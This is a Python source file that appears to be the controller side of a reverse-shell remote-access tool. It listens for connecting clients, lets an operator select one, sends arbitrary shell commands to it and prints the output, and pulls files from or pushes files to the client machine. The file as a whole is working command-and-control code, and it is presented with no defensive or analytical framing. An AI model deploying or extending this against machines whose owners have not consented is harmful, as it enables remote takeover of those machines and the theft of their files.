import socket
import threading
import os.path
from pprint import pprint

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003

BUFFER_SIZE = 1024
FORMAT = "utf-8"

list_clients = list()
# create a socket object
s = socket.socket()

client_i = -1

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
s.listen()
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")


def add_client():
    while True:
        client_socket, client_address = s.accept()
        # print(f"{client_address[0]}:{client_address[1]} Connected!")
    
        list_clients.append(dict(IP=client_address[0], port=client_address[1], socket=client_socket))
        # just sending a message, for demonstration purposes
        message = "Hello and Welcome".encode()
        client_socket.send(message)


thread = threading.Thread(target=add_client)
thread.start()


def show_clients():
    if len(list_clients) > 0:
        global client_i
        pprint(list_clients)
        client_i = int(input(f"""Which client you want to access: please Enter {0} to {len(list_clients) - 1}\n"""))
    else:
        print("There aren't clients yet...")

def commands():
    # retrieve command results
    results = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode()
    # print them
    print(results)


def download():
    [_, _, destination] = command.split()
    """ Receiving the filename from the client. """
    filename = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode(FORMAT)
    print(f"[RECV] Receiving the filename.")
    list_clients[client_i]["socket"].send("name received".encode(FORMAT))

    print(filename)
    file = open(os.path.join(destination, filename), "a")
    """ Receiving the file data from the client. """
    while True:
        print("before")
        data = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode(FORMAT)
        print("after")
        print(data[-3:])
        if data == "END":
            break
        elif data[-3:] == "END":
            file.write(data[:-3])
            break
        file.write(data)

    print(f"[RECV] Receiving the file data.")
    list_clients[client_i]["socket"].send("File data received".encode(FORMAT))
    """ Closing the file. """
    file.close()


def upload():
    [_, file_path, _] = command.split()
    file_name = os.path.basename(file_path)
    try:
        file = open(file_path, "r+")
        """ Sending the filename to the client. """
        list_clients[client_i]["socket"].send(file_name.encode(FORMAT))
        msg = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode(FORMAT)
        print(f"[CLIENT]: {msg}")
        """ Sending the file data to the client. """
        sub_data = str()
        while sub_data != "END":
            print("before")
            sub_data = file.read(BUFFER_SIZE)
            print(sub_data)
            print("after")
            if not sub_data:
                sub_data = "END"

            list_clients[client_i]["socket"].sendall(sub_data.encode(FORMAT))

        print("after while")
        msg = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode(FORMAT)

        print(f"[CLIENT]: {msg}")
        """ Closing the file. """
        file.close()

    except FileNotFoundError as NoFileErr:
        list_clients[client_i]["socket"].send(str(NoFileErr).encode(FORMAT))
    except Exception as err:
        list_clients[client_i]["socket"].send(str(err).encode(FORMAT))


while True:

    if len(list_clients) > 0:

        command = input("Enter the command you wanna execute:")
        if command.lower() == "show":
            show_clients()

        else:
            list_clients[client_i]["socket"].send(command.encode())
            if command.lower() == "exit":
                break

            elif command.split()[0].lower() == "download":
                download()

            elif command.split()[0].lower() == "upload":
                upload()

            else:
                commands()

# close connection to the client
list_clients[client_i]["socket"].close()
# close server connection
s.close()
